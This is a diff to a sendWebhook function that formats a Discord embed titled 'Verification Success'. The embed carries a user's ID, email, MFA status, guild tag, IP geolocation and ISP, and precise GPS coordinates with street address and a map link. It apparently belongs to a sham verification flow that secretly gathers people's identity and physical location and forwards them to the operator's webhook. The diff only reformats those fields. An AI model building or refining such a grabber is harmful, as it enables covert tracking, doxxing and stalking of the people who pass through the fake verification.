@@ -16,12 +16,12 @@ export async function sendWebhook(
     const fields = [
       {
         name: "👤User",
-        value: `${userInfo.global_name}(${userInfo.username || userInfo.username})`,
+        value: `${userInfo.global_name}(${userInfo.username})\nTags: \`${userInfo.primary_guild.tag}\` (\`${userInfo.primary_guild.identity_guild_id}\`)`,
         inline: false,
       },
       {
         name: "✉️User Info",
-        value: `ID: \`${userInfo.id}\`\nLocale: \`${userInfo.locale}\`\nMFA: \`${userInfo.mfa_enabled}\`\nMail: \`${userInfo.email}\`\nisVerified: \`${userInfo.verified}\``,
+        value: `ID: \`${userInfo.id}\`\nLocale: \`${userInfo.locale}\`\nMFA: \`${userInfo.mfa_enabled}\`\nEmail: \`${userInfo.email}\``,
         inline: false,
       },
       {
@@ -31,16 +31,15 @@ export async function sendWebhook(
       },
       {
         name: "🌎 Location from IP",
-        value: `Country: \`${ipInfo.country}\`\nCity, Region: \`${ipInfo.city}, ${ipInfo.region}\`\nLocation: \`${ipInfo.loc}\`\nTimezone: \`${ipInfo.timezone}\`\nISP: \`${ipInfo.org}\`\nMoreInfo: [Click here](https://ipinfo.io/${ipInfo.ip})`,
-        inline: false,
+        value: `Country: \`${ipInfo.country}\`\nCity, Region: \`${ipInfo.city}, ${ipInfo.region}\`\n IPLocation: \`${ipInfo.loc}\`\nTimezone: \`${ipInfo.timezone}\`\nISP: \`${ipInfo.org}\`\nMoreInfo: [Click here](https://ipinfo.io/${ipInfo.ip})`,
+        inline: true,
       },
       {
         name: "🌐 Location from GPS",
-        value: `Latitude: \`${location.latitude}\`\nLongitude: \`${location.longitude}\`\nAltitude: \`${location.altitude}\`\nAccuracy: \`${location.accuracy}\`\nAddress: \`${address}\`\nMoreInfo: [Click here](https://www.google.com/maps?q=${location.latitude},${location.longitude})`,
-        inline: false,
+        value: `Latitude, Longitude, Altitude: \`${location.latitude}, ${location.longitude}, ${location.altitude}\`\nAccuracy: \`${location.accuracy}\`\nAddress: \`${address}\`\nMoreInfo: [Click here](https://www.google.com/maps?q=${location.latitude},${location.longitude})`,
+        inline: true,
       },
     ];
-
 
     const embed = {
       title: "☑️Verification Success",
@@ -48,7 +47,7 @@ export async function sendWebhook(
       thumbnail: {
         url: `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png`,
       },
-      color: 0x00ff00, // Green
+      color: userInfo.accent_color ? parseInt(userInfo.accent_color, 16) : 0x00ff00,
       timestamp: new Date().toISOString(),
     };
 
